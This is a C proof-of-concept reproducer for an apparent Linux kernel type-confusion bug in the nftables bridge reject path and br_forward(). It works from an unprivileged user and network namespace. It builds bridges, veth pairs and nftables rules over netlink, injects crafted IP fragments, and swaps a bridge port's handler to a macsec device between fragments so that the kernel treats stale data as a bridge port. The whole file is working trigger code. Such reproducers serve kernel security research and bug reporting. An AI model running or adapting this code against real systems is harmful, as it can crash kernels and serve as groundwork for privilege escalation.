// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <time.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_packet.h>
#include <net/if.h>

#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif
#ifndef ETH_P_IP
#define ETH_P_IP 0x0800
#endif
#ifndef NETLINK_NETFILTER
#define NETLINK_NETFILTER 12
#endif

#define NFNL_SUBSYS_NFTABLES    10
#define NFNL_MSG_BATCH_BEGIN    16
#define NFNL_MSG_BATCH_END      17

#define NFT_MSG_NEWTABLE        0
#define NFT_MSG_NEWCHAIN        3
#define NFT_MSG_NEWRULE         6

#define NFTA_TABLE_NAME         1

#define NFTA_CHAIN_TABLE        1
#define NFTA_CHAIN_NAME         3
#define NFTA_CHAIN_HOOK         4
#define NFTA_CHAIN_TYPE         7

#define NFTA_HOOK_HOOKNUM       1
#define NFTA_HOOK_PRIORITY      2

#define NFTA_RULE_TABLE         1
#define NFTA_RULE_CHAIN         2
#define NFTA_RULE_EXPRESSIONS   4

#define NFTA_LIST_ELEM          1
#define NFTA_EXPR_NAME          1
#define NFTA_EXPR_DATA          2

#define NFTA_REJECT_TYPE        1
#define NFTA_REJECT_ICMP_CODE   2
#define NFT_REJECT_ICMP_UNREACH 0

#define NFTA_CT_DREG            1
#define NFTA_CT_KEY             2
#define NFT_CT_STATE            0
#define NFT_REG_1               1

#define NFPROTO_IPV4_           2
#define NFPROTO_BRIDGE_         7
#define NF_BR_PRE_ROUTING_      0

#define IFLA_BR_NF_CALL_IPTABLES_ 36
#define VETH_INFO_PEER_           1

struct nfgenmsg_ {
	uint8_t  nfgen_family;
	uint8_t  version;
	uint16_t res_id;
};

static void die(const char *m)
{
	fprintf(stderr, "[-] %s: %s\n", m, strerror(errno));
	exit(1);
}

#define MBSZ 16384
struct mb {
	char   b[MBSZ];
	size_t len;
};

static void mb_reset(struct mb *m)
{
	memset(m->b, 0, sizeof(m->b));
	m->len = 0;
}

static struct nlmsghdr *mb_hdr(struct mb *m, uint16_t type, uint16_t flags,
			       uint32_t seq)
{
	struct nlmsghdr *nh = (struct nlmsghdr *)(m->b + m->len);

	nh->nlmsg_len   = NLMSG_HDRLEN;
	nh->nlmsg_type  = type;
	nh->nlmsg_flags = flags;
	nh->nlmsg_seq   = seq;
	nh->nlmsg_pid   = 0;
	m->len += NLMSG_HDRLEN;
	return nh;
}

static void *mb_payload(struct mb *m, struct nlmsghdr *nh, const void *d,
			size_t l)
{
	void *p = m->b + m->len;

	if (d)
		memcpy(p, d, l);
	m->len += NLMSG_ALIGN(l);
	nh->nlmsg_len = (uint32_t)((m->b + m->len) - (char *)nh);
	return p;
}

static void mb_attr(struct mb *m, struct nlmsghdr *nh, uint16_t type,
		    const void *d, uint16_t dlen)
{
	struct nlattr *a = (struct nlattr *)(m->b + m->len);

	a->nla_len  = NLA_HDRLEN + dlen;
	a->nla_type = type;
	if (dlen && d)
		memcpy((char *)a + NLA_HDRLEN, d, dlen);
	m->len += NLA_ALIGN(a->nla_len);
	nh->nlmsg_len = (uint32_t)((m->b + m->len) - (char *)nh);
}

static void mb_attr_str(struct mb *m, struct nlmsghdr *nh, uint16_t t,
			const char *s)
{
	mb_attr(m, nh, t, s, (uint16_t)(strlen(s) + 1));
}

static void mb_attr_u32(struct mb *m, struct nlmsghdr *nh, uint16_t t,
			uint32_t v)
{
	mb_attr(m, nh, t, &v, 4);
}

static void mb_attr_u8(struct mb *m, struct nlmsghdr *nh, uint16_t t, uint8_t v)
{
	mb_attr(m, nh, t, &v, 1);
}

static struct nlattr *mb_nest(struct mb *m, uint16_t type, int nested_flag)
{
	struct nlattr *a = (struct nlattr *)(m->b + m->len);

	a->nla_len  = NLA_HDRLEN;
	a->nla_type = nested_flag ? (uint16_t)(type | NLA_F_NESTED) : type;
	m->len += NLA_HDRLEN;
	return a;
}

static void mb_nest_end(struct mb *m, struct nlmsghdr *nh, struct nlattr *a)
{
	a->nla_len = (uint16_t)((m->b + m->len) - (char *)a);
	nh->nlmsg_len = (uint32_t)((m->b + m->len) - (char *)nh);
}

static void mb_align(struct mb *m)
{
	m->len = NLMSG_ALIGN(m->len);
}

static int nl_open(int proto)
{
	struct sockaddr_nl sa;
	struct timeval tv;
	int fd;

	fd = socket(AF_NETLINK, SOCK_RAW, proto);
	if (fd < 0)
		die("socket(AF_NETLINK)");

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind(netlink)");

	tv.tv_sec = 0;
	tv.tv_usec = 400000;
	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	return fd;
}

static int nl_xfer(int fd, struct mb *m, const char *what)
{
	char rbuf[8192];
	int rc = 0;

	if (send(fd, m->b, m->len, 0) < 0) {
		fprintf(stderr, "[-] send(%s): %s\n", what, strerror(errno));
		return -1;
	}
	for (;;) {
		ssize_t n = recv(fd, rbuf, sizeof(rbuf), 0);
		struct nlmsghdr *nh;

		if (n <= 0)
			break;
		nh = (struct nlmsghdr *)rbuf;
		for (; NLMSG_OK(nh, (unsigned int)n); nh = NLMSG_NEXT(nh, n)) {
			if (nh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *e =
					(struct nlmsgerr *)NLMSG_DATA(nh);
				if (e->error) {
					fprintf(stderr,
						"[-] %s: netlink error %d (%s)\n",
						what, e->error,
						strerror(-e->error));
					rc = -1;
				}
			}
		}
	}
	return rc;
}

static int rtfd;
static uint32_t rtseq = 1;

static int rt_add_bridge(const char *name)
{
	struct mb m;
	struct nlmsghdr *nh;
	struct nlattr *li, *id;
	struct ifinfomsg ifi;

	mb_reset(&m);
	nh = mb_hdr(&m, RTM_NEWLINK,
		    NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
		    rtseq++);
	memset(&ifi, 0, sizeof(ifi));
	ifi.ifi_family = AF_UNSPEC;
	mb_payload(&m, nh, &ifi, sizeof(ifi));
	mb_attr_str(&m, nh, IFLA_IFNAME, name);
	li = mb_nest(&m, IFLA_LINKINFO, 0);
	mb_attr_str(&m, nh, IFLA_INFO_KIND, "bridge");
	id = mb_nest(&m, IFLA_INFO_DATA, 0);
	mb_attr_u8(&m, nh, IFLA_BR_NF_CALL_IPTABLES_, 1);
	mb_nest_end(&m, nh, id);
	mb_nest_end(&m, nh, li);
	return nl_xfer(rtfd, &m, "create bridge");
}

static int rt_add_veth(const char *a, const char *b)
{
	struct mb m;
	struct nlmsghdr *nh;
	struct nlattr *li, *id, *pe;
	struct ifinfomsg ifi;

	mb_reset(&m);
	nh = mb_hdr(&m, RTM_NEWLINK,
		    NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
		    rtseq++);
	memset(&ifi, 0, sizeof(ifi));
	ifi.ifi_family = AF_UNSPEC;
	mb_payload(&m, nh, &ifi, sizeof(ifi));
	mb_attr_str(&m, nh, IFLA_IFNAME, a);
	li = mb_nest(&m, IFLA_LINKINFO, 0);
	mb_attr_str(&m, nh, IFLA_INFO_KIND, "veth");
	id = mb_nest(&m, IFLA_INFO_DATA, 0);
	pe = mb_nest(&m, VETH_INFO_PEER_, 0);

	memcpy(m.b + m.len, &ifi, sizeof(ifi));
	m.len += sizeof(ifi);
	nh->nlmsg_len = (uint32_t)((m.b + m.len) - (char *)nh);
	mb_attr_str(&m, nh, IFLA_IFNAME, b);
	mb_nest_end(&m, nh, pe);
	mb_nest_end(&m, nh, id);
	mb_nest_end(&m, nh, li);
	return nl_xfer(rtfd, &m, "create veth");
}

static int rt_add_macsec(const char *name, int link_ifindex)
{
	struct mb m;
	struct nlmsghdr *nh;
	struct nlattr *li;
	struct ifinfomsg ifi;

	mb_reset(&m);
	nh = mb_hdr(&m, RTM_NEWLINK,
		    NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
		    rtseq++);
	memset(&ifi, 0, sizeof(ifi));
	ifi.ifi_family = AF_UNSPEC;
	mb_payload(&m, nh, &ifi, sizeof(ifi));
	mb_attr_str(&m, nh, IFLA_IFNAME, name);
	mb_attr_u32(&m, nh, IFLA_LINK, (uint32_t)link_ifindex);
	li = mb_nest(&m, IFLA_LINKINFO, 0);
	mb_attr_str(&m, nh, IFLA_INFO_KIND, "macsec");
	mb_nest_end(&m, nh, li);
	return nl_xfer(rtfd, &m, "create macsec");
}

static int rt_setlink(int ifindex, uint32_t flags, uint32_t change,
		      int set_master, uint32_t master)
{
	struct mb m;
	struct nlmsghdr *nh;
	struct ifinfomsg ifi;

	mb_reset(&m);
	nh = mb_hdr(&m, RTM_SETLINK, NLM_F_REQUEST | NLM_F_ACK, rtseq++);
	memset(&ifi, 0, sizeof(ifi));
	ifi.ifi_family = AF_UNSPEC;
	ifi.ifi_index  = ifindex;
	ifi.ifi_flags  = flags;
	ifi.ifi_change = change;
	mb_payload(&m, nh, &ifi, sizeof(ifi));
	if (set_master)
		mb_attr_u32(&m, nh, IFLA_MASTER, master);
	return nl_xfer(rtfd, &m, "setlink");
}

static int nffd;
static uint32_t nfseq = 100;

static struct nlmsghdr *nft_msg(struct mb *m, uint8_t nft_type, uint8_t family,
				uint16_t extra_flags)
{
	struct nlmsghdr *nh;
	struct nfgenmsg_ g;

	mb_align(m);
	nh = mb_hdr(m, (uint16_t)((NFNL_SUBSYS_NFTABLES << 8) | nft_type),
		    NLM_F_REQUEST | NLM_F_ACK | extra_flags, nfseq++);
	g.nfgen_family = family;
	g.version = 0;
	g.res_id = htons(0);
	mb_payload(m, nh, &g, sizeof(g));
	return nh;
}

static void nft_batch_marker(struct mb *m, uint16_t type)
{
	struct nlmsghdr *nh;
	struct nfgenmsg_ g;

	mb_align(m);
	nh = mb_hdr(m, type, NLM_F_REQUEST, nfseq++);
	g.nfgen_family = AF_UNSPEC;
	g.version = 0;
	g.res_id = htons(NFNL_SUBSYS_NFTABLES);
	mb_payload(m, nh, &g, sizeof(g));
}

static int nft_setup(void)
{
	struct mb m;
	struct nlmsghdr *nh;
	struct nlattr *hook, *exprs, *elem, *edata;
	uint32_t v;

	mb_reset(&m);
	nft_batch_marker(&m, NFNL_MSG_BATCH_BEGIN);

	nh = nft_msg(&m, NFT_MSG_NEWTABLE, NFPROTO_BRIDGE_, NLM_F_CREATE);
	mb_attr_str(&m, nh, NFTA_TABLE_NAME, "t");

	nh = nft_msg(&m, NFT_MSG_NEWCHAIN, NFPROTO_BRIDGE_, NLM_F_CREATE);
	mb_attr_str(&m, nh, NFTA_CHAIN_TABLE, "t");
	mb_attr_str(&m, nh, NFTA_CHAIN_NAME, "c");
	hook = mb_nest(&m, NFTA_CHAIN_HOOK, 1);
	v = htonl(NF_BR_PRE_ROUTING_);
	mb_attr(&m, nh, NFTA_HOOK_HOOKNUM, &v, 4);
	v = htonl(100);
	mb_attr(&m, nh, NFTA_HOOK_PRIORITY, &v, 4);
	mb_nest_end(&m, nh, hook);
	mb_attr_str(&m, nh, NFTA_CHAIN_TYPE, "filter");

	nh = nft_msg(&m, NFT_MSG_NEWRULE, NFPROTO_BRIDGE_,
		     NLM_F_CREATE | NLM_F_APPEND);
	mb_attr_str(&m, nh, NFTA_RULE_TABLE, "t");
	mb_attr_str(&m, nh, NFTA_RULE_CHAIN, "c");
	exprs = mb_nest(&m, NFTA_RULE_EXPRESSIONS, 1);
	elem  = mb_nest(&m, NFTA_LIST_ELEM, 1);
	mb_attr_str(&m, nh, NFTA_EXPR_NAME, "reject");
	edata = mb_nest(&m, NFTA_EXPR_DATA, 1);
	v = htonl(NFT_REJECT_ICMP_UNREACH);
	mb_attr(&m, nh, NFTA_REJECT_TYPE, &v, 4);
	mb_attr_u8(&m, nh, NFTA_REJECT_ICMP_CODE, 1 );
	mb_nest_end(&m, nh, edata);
	mb_nest_end(&m, nh, elem);
	mb_nest_end(&m, nh, exprs);

	nh = nft_msg(&m, NFT_MSG_NEWTABLE, NFPROTO_IPV4_, NLM_F_CREATE);
	mb_attr_str(&m, nh, NFTA_TABLE_NAME, "t4");

	nh = nft_msg(&m, NFT_MSG_NEWCHAIN, NFPROTO_IPV4_, NLM_F_CREATE);
	mb_attr_str(&m, nh, NFTA_CHAIN_TABLE, "t4");
	mb_attr_str(&m, nh, NFTA_CHAIN_NAME, "c4");

	nh = nft_msg(&m, NFT_MSG_NEWRULE, NFPROTO_IPV4_,
		     NLM_F_CREATE | NLM_F_APPEND);
	mb_attr_str(&m, nh, NFTA_RULE_TABLE, "t4");
	mb_attr_str(&m, nh, NFTA_RULE_CHAIN, "c4");
	exprs = mb_nest(&m, NFTA_RULE_EXPRESSIONS, 1);
	elem  = mb_nest(&m, NFTA_LIST_ELEM, 1);
	mb_attr_str(&m, nh, NFTA_EXPR_NAME, "ct");
	edata = mb_nest(&m, NFTA_EXPR_DATA, 1);
	v = htonl(NFT_REG_1);
	mb_attr(&m, nh, NFTA_CT_DREG, &v, 4);
	v = htonl(NFT_CT_STATE);
	mb_attr(&m, nh, NFTA_CT_KEY, &v, 4);
	mb_nest_end(&m, nh, edata);
	mb_nest_end(&m, nh, elem);
	mb_nest_end(&m, nh, exprs);

	nft_batch_marker(&m, NFNL_MSG_BATCH_END);
	return nl_xfer(nffd, &m, "nft batch");
}

static const uint8_t dmac[6] = { 0x02, 0x00, 0x00, 0x00, 0x00, 0x02 };
static const uint8_t smac[6] = { 0x02, 0x00, 0x00, 0x00, 0x00, 0x01 };

static uint16_t csum16(const void *buf, int len)
{
	const uint8_t *p = buf;
	uint32_t sum = 0;
	int i;

	for (i = 0; i + 1 < len; i += 2)
		sum += (uint32_t)((p[i] << 8) | p[i + 1]);
	if (i < len)
		sum += (uint32_t)(p[i] << 8);
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return (uint16_t)(~sum);
}

static int build_frag(uint8_t *out, uint16_t ipid, const uint8_t *payload,
		      int paylen, int frag_off_bytes, int more)
{
	uint8_t *eth = out;
	uint8_t *ip  = out + 14;
	uint16_t ff;
	uint16_t c;

	memcpy(eth, dmac, 6);
	memcpy(eth + 6, smac, 6);
	eth[12] = (ETH_P_IP >> 8) & 0xff;
	eth[13] = ETH_P_IP & 0xff;

	memset(ip, 0, 20);
	ip[0] = 0x45;
	ip[1] = 0x00;
	ip[2] = (uint8_t)(((20 + paylen) >> 8) & 0xff);
	ip[3] = (uint8_t)((20 + paylen) & 0xff);
	ip[4] = (uint8_t)(ipid >> 8);
	ip[5] = (uint8_t)(ipid & 0xff);
	ff = (uint16_t)((frag_off_bytes / 8) & 0x1fff);
	if (more)
		ff |= 0x2000;
	ip[6] = (uint8_t)(ff >> 8);
	ip[7] = (uint8_t)(ff & 0xff);
	ip[8] = 64;
	ip[9] = 17;
	ip[10] = ip[11] = 0;
	ip[12] = 10; ip[13] = 0; ip[14] = 0; ip[15] = 1;
	ip[16] = 10; ip[17] = 0; ip[18] = 0; ip[19] = 2;
	c = csum16(ip, 20);
	ip[10] = (uint8_t)(c >> 8);
	ip[11] = (uint8_t)(c & 0xff);

	memcpy(ip + 20, payload, paylen);
	return 14 + 20 + paylen;
}

static int pkt_sock(int ifindex)
{
	struct sockaddr_ll sll;
	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	if (fd < 0)
		die("socket(AF_PACKET)");
	memset(&sll, 0, sizeof(sll));
	sll.sll_family   = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex  = ifindex;
	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die("bind(AF_PACKET)");
	return fd;
}

static void pkt_send(int fd, int ifindex, const uint8_t *frame, int len)
{
	struct sockaddr_ll sll;

	memset(&sll, 0, sizeof(sll));
	sll.sll_family  = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen   = 6;
	memcpy(sll.sll_addr, dmac, 6);
	if (sendto(fd, frame, len, 0, (struct sockaddr *)&sll,
		   sizeof(sll)) < 0)
		fprintf(stderr, "[-] sendto: %s\n", strerror(errno));
}

static void wfile(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);

	if (fd < 0)
		return;
	if (write(fd, val, strlen(val)) < 0) {

	}
	close(fd);
}

static void enter_ns(void)
{
	char buf[64];
	uid_t uid = getuid();
	gid_t gid = getgid();

	if (uid == 0) {
		if (setresgid(1000, 1000, 1000) == 0 &&
		    setresuid(1000, 1000, 1000) == 0) {
			uid = 1000;
			gid = 1000;
			printf("[*] dropped to uid/gid 1000\n");
		}

		prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
	}

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
		die("unshare(CLONE_NEWUSER|CLONE_NEWNET)");

	wfile("/proc/self/setgroups", "deny");
	snprintf(buf, sizeof(buf), "0 %u 1", (unsigned)uid);
	wfile("/proc/self/uid_map", buf);
	snprintf(buf, sizeof(buf), "0 %u 1", (unsigned)gid);
	wfile("/proc/self/gid_map", buf);

	printf("[*] in new user+net ns, euid=%u\n", (unsigned)geteuid());
}

int main(void)
{
	uint8_t f1[128], f2[128];
	uint8_t pay1[16], pay2[16];
	int l1, l2;
	int ibr, iva, ivap, ivb, ivbp;
	int sa, sb;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("[*] nft_reject_bridge / br_forward() stale-port type confusion PoC\n");

	enter_ns();

	rtfd = nl_open(NETLINK_ROUTE);
	nffd = nl_open(NETLINK_NETFILTER);

	if (rt_add_bridge("br0"))
		return 1;
	wfile("/proc/sys/net/bridge/bridge-nf-call-iptables", "1");

	if (rt_add_veth("va", "vap"))
		return 1;
	if (rt_add_veth("vb", "vbp"))
		return 1;

	ibr  = (int)if_nametoindex("br0");
	iva  = (int)if_nametoindex("va");
	ivap = (int)if_nametoindex("vap");
	ivb  = (int)if_nametoindex("vb");
	ivbp = (int)if_nametoindex("vbp");
	printf("[*] br0=%d va=%d vap=%d vb=%d vbp=%d\n", ibr, iva, ivap, ivb,
	       ivbp);
	if (!ibr || !iva || !ivap || !ivb || !ivbp)
		return 1;

	rt_setlink(iva, 0, 0, 1, (uint32_t)ibr);
	rt_setlink(ivb, 0, 0, 1, (uint32_t)ibr);

	rt_setlink(ibr,  IFF_UP, IFF_UP, 0, 0);
	rt_setlink(iva,  IFF_UP, IFF_UP, 0, 0);
	rt_setlink(ivap, IFF_UP, IFF_UP, 0, 0);
	rt_setlink(ivb,  IFF_UP, IFF_UP, 0, 0);
	rt_setlink(ivbp, IFF_UP, IFF_UP, 0, 0);

	if (nft_setup())
		fprintf(stderr, "[!] nft setup reported errors, continuing\n");
	else
		printf("[+] nft bridge prerouting prio-100 reject rule installed\n");

	usleep(300000);

	memset(pay1, 0, sizeof(pay1));
	pay1[0] = 0x30; pay1[1] = 0x39;
	pay1[2] = 0x00; pay1[3] = 0x35;
	pay1[4] = 0x00; pay1[5] = 0x20;
	pay1[6] = 0x00; pay1[7] = 0x00;
	memset(pay1 + 8, 'A', 8);
	l1 = build_frag(f1, 0x4242, pay1, 16, 0, 1);

	memset(pay2, 'B', sizeof(pay2));
	l2 = build_frag(f2, 0x4242, pay2, 16, 16, 0);

	sa = pkt_sock(ivap);
	sb = pkt_sock(ivbp);

	printf("[*] injecting head fragment on vap (-> bridge port va)\n");
	pkt_send(sa, ivap, f1, l1);

	usleep(300000);

	printf("[*] removing va from br0 and attaching a macsec device to it\n");
	if (rt_setlink(iva, 0, 0, 1, 0))
		fprintf(stderr, "[!] nomaster failed\n");
	if (rt_add_macsec("mcs0", iva))
		fprintf(stderr, "[!] macsec creation failed\n");
	else
		printf("[+] va->rx_handler_data now points at a 16-byte "
		       "struct macsec_rxh_data\n");

	usleep(100000);

	printf("[*] injecting tail fragment on vbp (-> bridge port vb)\n");
	printf("[*] expect: reassembly -> br_nf_pre_routing_finish() -> "
	       "br_nf_hook_thresh(indev=va) -> nft reject -> "
	       "br_forward(macsec_rxh_data)\n");
	pkt_send(sb, ivbp, f2, l2);

	sleep(3);
	printf("[*] done (no crash?)\n");
	return 0;
}
